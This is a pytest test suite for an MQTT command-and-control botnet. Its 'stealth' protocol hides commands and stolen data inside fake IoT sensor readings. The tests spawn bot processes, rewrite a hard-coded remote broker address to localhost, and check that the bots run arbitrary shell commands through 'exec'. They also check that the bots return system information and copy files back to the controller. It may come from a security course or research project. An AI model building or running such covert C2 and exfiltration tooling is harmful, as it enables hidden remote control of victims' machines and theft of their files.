"""
End-to-end tests for the MQTT C&C botnet with layered protocol stack.
Assumes the MQTT broker is running on 127.0.0.1:1883.

The tests automatically launch and teardown 3 bot processes.

Run with: pytest test_e2e.py -v
"""
import pytest
import json
import time
import hashlib
import threading
import queue
import tempfile
import os
import subprocess
import sys
import zlib
import base64
import uuid
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# Import the protocol stack directly for testing
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from protocol import ProtocolStack, StealthProtocolStack, DEFAULT_SALT

# --- CONFIGURATION ---
BROKER = "127.0.0.1"
PORT = 1883
TOPIC = "sensors"
SALT = DEFAULT_SALT
NUM_BOTS = 3  # Number of bots to spawn for testing

# Path to the bot script
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BOT_SCRIPT = os.path.join(SCRIPT_DIR, "bot.py")
VENV_PYTHON = os.path.join(SCRIPT_DIR, "venv", "bin", "python")
PYTHON_EXECUTABLE = VENV_PYTHON if os.path.exists(VENV_PYTHON) else sys.executable


class TestStealthMode:
    """Tests for steganographic float encoding."""
    
    def test_stealth_layer_encode_decode_roundtrip(self):
        """Test encoding and decoding data in floats."""
        from protocol import StealthEncryptionLayer
        
        layer = StealthEncryptionLayer(node_id="test_node", salt=DEFAULT_SALT)
        
        # Create a small payload
        test_data = b"Hello!"  # 6 bytes
        encrypted = layer._xor_encrypt(test_data)
        
        # Encode in sensor data
        packet = layer._create_sensor_data_with_payload(encrypted)
        
        # Verify packet structure
        assert "sensor_id" in packet
        assert "temp" in packet
        assert "hum" in packet
        assert "pres" in packet
        assert "light" in packet
        assert "co2" in packet
        assert "noise" in packet
        assert "fingerprint" not in packet  # No fingerprint in stealth mode
        
        # Decode from packet
        extracted = layer._extract_payload_from_packet(packet)
        decrypted = layer._xor_encrypt(extracted[:len(encrypted)])
        
        assert decrypted == test_data
    
    def test_stealth_float_values_look_realistic(self):
        """Test that encoded floats appear as realistic sensor values."""
        from protocol import StealthEncryptionLayer
        
        layer = StealthEncryptionLayer(node_id="test_node", salt=DEFAULT_SALT)
        
        # Create packet with hidden data
        test_data = b"SecretData123456"
        encrypted = layer._xor_encrypt(test_data)
        packet = layer._create_sensor_data_with_payload(encrypted)
        
        # Check ranges (first 3 decimal places should be in range)
        # When displayed, values should look realistic
        temp = packet["temp"]
        hum = packet["hum"]
        pres = packet["pres"]
        light = packet["light"]
        co2 = packet["co2"]
        noise = packet["noise"]
        bat = packet["bat"]
        wifi = packet["wifi"]
        pm25 = packet["pm25"]
        pm10 = packet["pm10"]
        
        # The integer part should be within expected ranges
        assert 0 < temp < 100, f"temp {temp} should be reasonable"
        assert 0 < hum < 100, f"hum {hum} should be reasonable"
        assert 900 < pres < 1100, f"pres {pres} should be reasonable"
        assert -1000 < light < 2000, f"light {light} should be reasonable"
        assert 0 < co2 < 5000, f"co2 {co2} should be reasonable"
        assert 0 < noise < 150, f"noise {noise} should be reasonable"
        assert 3.0 <= bat <= 4.21, f"bat {bat} should be reasonable"
        assert -90.0 <= wifi <= -29.0, f"wifi {wifi} should be reasonable"
        assert 0 <= pm25 <= 500.01, f"pm25 {pm25} should be reasonable"
        assert 0 <= pm10 <= 500.01, f"pm10 {pm10} should be reasonable"
        
        # All values should be valid floats (not NaN or Inf)
        import math
        for name, val in [("temp", temp), ("hum", hum), ("pres", pres), 
                         ("light", light), ("co2", co2), ("noise", noise),
                         ("bat", bat), ("wifi", wifi), ("pm25", pm25), ("pm10", pm10)]:
            assert math.isfinite(val), f"{name} should be finite, got {val}"
    
    def test_stealth_placeholder_packet_has_no_fingerprint(self):
        """Placeholder packets should have no fingerprint field."""
        from protocol import StealthEncryptionLayer
        
        layer = StealthEncryptionLayer(node_id="test_node", salt=DEFAULT_SALT)
        from protocol import deserialize_packet
        raw_packet = layer.create_placeholder_packet()
        packet = deserialize_packet(raw_packet)
        
        assert "fingerprint" not in packet
        assert "temp" in packet
        assert "hum" in packet
    
    def test_stealth_max_payload_size(self):
        """Test max payload size is correct."""
        from protocol import StealthEncryptionLayer
        
        layer = StealthEncryptionLayer(node_id="test_node", salt=DEFAULT_SALT)
        
        # 10 fields * 4 bytes = 40 bytes. -3 overhead = 37 bytes.
        assert layer.get_max_payload_size() == 37
    
    def test_stealth_protocol_stack_creation(self):
        """Test creating a stealth protocol stack."""
        from protocol import StealthProtocolStack
        
        stack = StealthProtocolStack(
            node_id="test_stealth",
            broker=BROKER,
            port=PORT,
            topic=TOPIC,
            salt=SALT
        )
        
        # Should have stealth encryption layer
        assert hasattr(stack, 'encryption')
        assert "Stealth" in type(stack.encryption).__name__


class StealthTestClientHelper:
    """Test client using the stealth protocol stack."""
    
    def __init__(self, client_id="test_stealth_controller"):
        self.client_id = client_id
        self.responses = queue.Queue()
        self.all_messages = queue.Queue()
        self.discovered_bots = set()
        
        self.stack = StealthProtocolStack(
            node_id=client_id,
            broker=BROKER,
            port=PORT,
            topic=TOPIC,
            salt=SALT,
            send_interval=0.1  # Very fast for testing
        )
        self.stack.application.on_receive(self._on_message)
        # Calculate my sender ID to ignore own messages (uses sensor_N format after decode)
        my_hash = self.stack.application.my_hash
        self.my_sender_id = f"sensor_{my_hash}" if my_hash < 0xFFFF else f"HASH_{my_hash:04x}"
        self.stack.on_receive(self._on_message)
    
    def _on_message(self, message: dict):
        self.all_messages.put(message)
        
        sender = message.get("sender", "")
        # Ignore messages from myself
        if sender == self.my_sender_id:
            return

        if (sender.startswith("sensor_") or sender.startswith("HASH_")):
            self.discovered_bots.add(sender)
        
        msg_type = message.get("type")
        target = message.get("target")
        if msg_type in ("response", "file_response") and (target == self.client_id or target == "ME"):
            self.responses.put(message)
    
    def connect(self):
        self.stack.start()
        time.sleep(0.5)
    
    def disconnect(self):
        self.stack.stop()
    
    def send_command(self, target: str, cmd: str, arg: str = ""):
        self.stack.send(target, "command", cmd=cmd, arg=arg)
    
    def wait_for_response(self, timeout: float = 30) -> dict:
        """Wait for response (longer timeout for stealth - multiple chunks)."""
        try:
            return self.responses.get(timeout=timeout)
        except queue.Empty:
            return None
    
    def wait_for_responses(self, count: int, timeout: float = 60) -> list:
        """Wait for multiple responses."""
        results = []
        deadline = time.time() + timeout
        while len(results) < count and time.time() < deadline:
            try:
                results.append(self.responses.get(timeout=0.5))
            except queue.Empty:
                pass
        return results
    
    def clear_queues(self):
        while not self.responses.empty():
            try:
                self.responses.get_nowait()
            except queue.Empty:
                break


@pytest.fixture(scope="module")
def stealth_bot_processes():
    """Launch stealth mode bots for testing."""
    processes = []
    test_scripts = []
    
    with open(BOT_SCRIPT, 'r') as f:
        bot_code = f.read()
    
    # Enable stealth mode and use localhost
    bot_code = bot_code.replace('BROKER = "147.32.82.209"', 'BROKER = "127.0.0.1"')
    bot_code = bot_code.replace('USE_STEALTH_MODE = False', 'USE_STEALTH_MODE = True')
    # Make send interval very fast for testing
    bot_code = bot_code.replace('SEND_INTERVAL = 1.0', 'SEND_INTERVAL = 0.1')
    
    for i in range(3):  # 3 stealth bots
        script_path = os.path.join(SCRIPT_DIR, f"_test_stealth_bot_{i}.py")
        test_scripts.append(script_path)
        
        with open(script_path, 'w') as f:
            f.write(bot_code)
        
        env = os.environ.copy()
        env["DEBUG"] = "True"
        env["USE_STEALTH_MODE"] = "True"
        
        proc = subprocess.Popen(
            [PYTHON_EXECUTABLE, script_path],
            stdout=None,
            stderr=None,
            cwd=SCRIPT_DIR,
            env=env
        )
        processes.append(proc)
    
    time.sleep(5)  # Stealth mode needs more time (ID scan + init)
    
    yield processes
    
    for proc in processes:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    
    for script in test_scripts:
        if os.path.exists(script):
            os.remove(script)


@pytest.fixture
def stealth_test_client(stealth_bot_processes):
    """Provide a connected stealth test client."""
    client = StealthTestClientHelper()
    client.connect()
    client.clear_queues()
    yield client
    client.disconnect()


class TestStealthE2E:
    """End-to-end tests for stealth mode (uses chunked packets)."""
    
    def test_stealth_ping_command(self, stealth_test_client):
        """Test ping command works in stealth mode."""
        stealth_test_client.send_command("ALL", "ping")
        # Stealth mode needs longer timeout due to small packet size
        response = stealth_test_client.wait_for_response(timeout=60)
        
        assert response is not None, "Should receive ping response in stealth mode"
        assert response["output"] == "Pong"
    
    def test_stealth_id_command(self, stealth_test_client):
        """Test id command in stealth mode."""
        stealth_test_client.send_command("ALL", "id")
        response = stealth_test_client.wait_for_response(timeout=60)
        
        assert response is not None
        assert "uid=" in response["output"]
    
    def test_stealth_copy_small_file(self, stealth_test_client):
        """Test file copy in stealth mode with binary transfer verification."""
        test_content = b"SECRET_DATA_12345_STEALTH"
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.txt') as f:
            f.write(test_content)
            temp_path = f.name
        
        filename = os.path.basename(temp_path)
        downloads_dir = "downloads"
        local_path = os.path.join(downloads_dir, filename)
        
        try:
            if os.path.exists(local_path):
                os.unlink(local_path)
            
            stealth_test_client.send_command("ALL", "copy", temp_path)
            response = stealth_test_client.wait_for_response(timeout=60)
            
            assert response is not None, "Should receive file copy response"
            assert response.get("type") == "file_response"
            assert response.get("filename") == filename
            assert response.get("file_data") == test_content
            
            # Verify by saving to downloads
            os.makedirs(downloads_dir, exist_ok=True)
            with open(local_path, 'wb') as f:
                f.write(response.get("file_data", b""))
            
            with open(local_path, 'rb') as f:
                saved_content = f.read()
            assert saved_content == test_content, "Saved file content should match original"
        finally:
            os.unlink(temp_path)
            if os.path.exists(local_path):
                os.unlink(local_path)
    
    def test_stealth_copy_medium_file(self, stealth_test_client):
        """Test copying a medium file (~500 bytes) in stealth mode with binary verification."""
        test_content = b"MEDIUM_" + b"X" * 480 + b"_END"
        
        with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.txt') as f:
            f.write(test_content)
            temp_path = f.name
        
        try:
            stealth_test_client.send_command("ALL", "copy", temp_path)
            response = stealth_test_client.wait_for_response(timeout=120)
            
            assert response is not None, "Should receive medium file response"
            assert response.get("type") == "file_response"
            assert response.get("file_data") == test_content, "File content should match"
        finally:
            os.unlink(temp_path)
    
    def test_stealth_w_command(self, stealth_test_client):
        """Test w command in stealth mode."""
        stealth_test_client.send_command("ALL", "w")
        response = stealth_test_client.wait_for_response(timeout=60)
        
        assert response is not None
        assert len(response["output"]) > 0
    
    def test_stealth_ls_command(self, stealth_test_client):
        """Test ls command in stealth mode."""
        # Create a temp directory with a unique name
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a dummy file inside
            with open(os.path.join(temp_dir, "stealth_ls_test.txt"), 'w') as f:
                f.write("test")
            
            stealth_test_client.send_command("ALL", "ls", temp_dir)
            response = stealth_test_client.wait_for_response(timeout=60)
            
            assert response is not None
            assert "stealth_ls_test.txt" in response["output"]
    
    def test_stealth_exec_command(self, stealth_test_client):
        """Test exec command in stealth mode."""
        stealth_test_client.send_command("ALL", "exec", "echo 'stealth_exec'")
        response = stealth_test_client.wait_for_response(timeout=60)
        
        assert response is not None
        assert "stealth_exec" in response["output"]


    def test_stealth_target_specific_bot(self, stealth_test_client):
        """Test targeting a specific bot in stealth mode."""
        # First discover bots
        stealth_test_client.send_command("ALL", "ping")
        # Wait for responses from ALL bots (we launched 3)
        discovered_count = 0
        start_wait = time.time()
        while time.time() - start_wait < 30 and discovered_count < 3:
             if stealth_test_client.wait_for_response(timeout=5):
                 discovered_count += 1
        
        assert len(stealth_test_client.discovered_bots) >= 1, "No bots discovered"
        target_bot = list(stealth_test_client.discovered_bots)[0]
        
        # Clear queues
        stealth_test_client.clear_queues()
        
        # Send to specific bot
        stealth_test_client.send_command(target_bot, "ping")
        responses = []
        start_time = time.time()
        while time.time() - start_time < 30:
            resp = stealth_test_client.wait_for_response(timeout=5)
            if resp:
                responses.append(resp)
                if len(responses) >= 2: break # Should only get 1, but wait briefly to see if more come
        
        assert len(responses) == 1, f"Expected 1 response, got {len(responses)}"
        assert responses[0]["sender"] == target_bot
        
    def test_stealth_wrong_target_ignored(self, stealth_test_client):
        """Test that bots ignore commands not targeted at them."""
        stealth_test_client.clear_queues()
        
        # Send to a non-existent target hash (2 bytes = 4 hex chars)
        fake_target = "HASH_beef"
        stealth_test_client.send_command(fake_target, "ping")
        
        response = stealth_test_client.wait_for_response(timeout=10)
        assert response is None, "Should not receive response for wrong target"

    def test_stealth_unknown_command(self, stealth_test_client):
        """Test sending an unknown command in stealth mode."""
        stealth_test_client.send_command("ALL", "not_a_command")
        response = stealth_test_client.wait_for_response(timeout=30)
        
        assert response is not None
        assert "Unknown Cmd" in response["output"]

    def test_stealth_copy_nonexistent_file(self, stealth_test_client):
        """Test copying nonexistent file in stealth mode."""
        stealth_test_client.send_command("ALL", "copy", "/nonexistent/path.txt")
        response = stealth_test_client.wait_for_response(timeout=30)
        
        assert response is not None
        assert "File not found" in response["output"]
    
    def test_stealth_all_bots_respond(self, stealth_test_client):
        """All bots should respond to ping in stealth mode."""
        stealth_test_client.send_command("ALL", "ping")
        responses = stealth_test_client.wait_for_responses(count=3, timeout=60)
        
        assert len(responses) >= 1, "Should receive at least one response"
        for resp in responses:
            assert resp["output"] == "Pong"
    
    def test_stealth_discover_multiple_bots(self, stealth_test_client):
        """Discover multiple bots in stealth mode."""
        stealth_test_client.send_command("ALL", "ping")
        stealth_test_client.wait_for_responses(count=3, timeout=60)
        
        assert len(stealth_test_client.discovered_bots) >= 1, "Should discover at least one bot"
    
    def test_stealth_all_target(self, stealth_test_client):
        """Test ALL target is received in stealth mode."""
        stealth_test_client.send_command("ALL", "ping")
        response = stealth_test_client.wait_for_response(timeout=30)
        
        assert response is not None


class TestNoiseResilience:
    """Tests for stealth mode resilience against malformed traffic."""
    
    def test_random_binary_noise(self, stealth_test_client):
        """Stealth protocol should ignore random binary data."""
        import paho.mqtt.client as mqtt
        
        noise_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
        noise_client.connect(BROKER, PORT, 60)
        
        # Send various malformed packets
        noise_packets = [
            b"",                              
            b"\x00\x01\x02\x03",              
            b"not json at all",               
            os.urandom(100),                  
            os.urandom(152),  # Same size as stealth packet
            b"\xff" * 50,                     
        ]
        
        for packet in noise_packets:
            noise_client.publish(TOPIC, packet)
            time.sleep(0.2)
        
        noise_client.disconnect()
        
        # Bot should still respond
        time.sleep(2)
        stealth_test_client.send_command("ALL", "ping")
        response = stealth_test_client.wait_for_response(timeout=30)
        
        assert response is not None, "Bot should still respond after noise"
        assert response["output"] == "Pong"
    
    def test_fake_sensor_packets(self, stealth_test_client):
        """Stealth protocol should ignore fake sensor data without fingerprint."""
        import paho.mqtt.client as mqtt
        from layers.encryption import serialize_packet
        
        noise_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
        noise_client.connect(BROKER, PORT, 60)
        
        # Fake sensor packets that look real but have no hidden data
        for i in range(5):
            fake_packet = {
                "sensor_id": f"fake_{i}",
                "temp": 22.5,
                "hum": 55.0,
                "pres": 1013.25,
            }
            noise_client.publish(TOPIC, serialize_packet(fake_packet))
            time.sleep(0.5)
        
        noise_client.disconnect()
        
        # Bot should still work
        time.sleep(2)
        stealth_test_client.send_command("ALL", "id")
        response = stealth_test_client.wait_for_response(timeout=30)
        
        assert response is not None, "Bot should respond after fake sensor noise"
        assert "uid=" in response["output"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
